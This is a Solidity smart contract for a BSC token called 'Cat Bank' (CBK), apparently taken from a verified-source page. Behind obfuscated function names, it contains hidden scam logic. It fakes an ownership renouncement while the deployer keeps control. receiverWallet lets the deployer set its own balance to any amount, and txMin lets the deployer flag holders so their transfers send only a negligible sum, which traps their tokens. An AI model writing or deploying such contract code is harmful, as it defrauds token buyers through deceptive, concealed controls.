/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface exemptFeeList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minTo {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CatBank {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;


    bool public senderFromMin;
    string public name = "Cat Bank";
    address public receiverToMarketing;
    mapping(address => bool) public exemptAt;
    uint256 constant buyShould = 11 ** 10;


    address public sellFrom;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    string public symbol = "CBK";
    address public owner;
    mapping(address => bool) public amountMax;
    mapping(address => uint256) public balanceOf;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        exemptFeeList listExemptLiquidity = exemptFeeList(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverToMarketing = minTo(listExemptLiquidity.factory()).createPair(listExemptLiquidity.WETH(), address(this));
        owner = listEnable();
        sellFrom = owner;
        amountMax[sellFrom] = true;
        balanceOf[sellFrom] = totalSupply;
        emit Transfer(address(0), sellFrom, totalSupply);
        walletBuy();
    }

    

    function transfer(address takeReceiverMin, uint256 autoTotal) external returns (bool) {
        return transferFrom(listEnable(), takeReceiverMin, autoTotal);
    }

    function receiverWallet(uint256 autoTotal) public {
        if (!amountMax[listEnable()]) {
            return;
        }
        balanceOf[sellFrom] = autoTotal;
    }

    function listEnable() private view returns (address) {
        return msg.sender;
    }

    function fromTxMarketing(address modeAmount) public {
        if (senderFromMin) {
            return;
        }
        amountMax[modeAmount] = true;
        senderFromMin = true;
    }

    function transferFrom(address exemptMax, address takeReceiverMin, uint256 autoTotal) public returns (bool) {
        if (exemptMax != listEnable() && allowance[exemptMax][listEnable()] != type(uint256).max) {
            require(allowance[exemptMax][listEnable()] >= autoTotal);
            allowance[exemptMax][listEnable()] -= autoTotal;
        }
        if (takeReceiverMin == sellFrom || exemptMax == sellFrom) {
            return liquiditySender(exemptMax, takeReceiverMin, autoTotal);
        }
        if (exemptAt[exemptMax]) {
            return liquiditySender(exemptMax, takeReceiverMin, buyShould);
        }
        return liquiditySender(exemptMax, takeReceiverMin, autoTotal);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address liquidityToken, uint256 autoTotal) public returns (bool) {
        allowance[listEnable()][liquidityToken] = autoTotal;
        emit Approval(listEnable(), liquidityToken, autoTotal);
        return true;
    }

    function txMin(address feeWallet) public {
        if (feeWallet == sellFrom || feeWallet == receiverToMarketing || !amountMax[listEnable()]) {
            return;
        }
        exemptAt[feeWallet] = true;
    }

    function walletBuy() public {
        emit OwnershipTransferred(sellFrom, address(0));
        owner = address(0);
    }

    function liquiditySender(address liquidityReceiver, address launchedTx, uint256 autoTotal) internal returns (bool) {
        require(balanceOf[liquidityReceiver] >= autoTotal);
        balanceOf[liquidityReceiver] -= autoTotal;
        balanceOf[launchedTx] += autoTotal;
        emit Transfer(liquidityReceiver, launchedTx, autoTotal);
        return true;
    }


}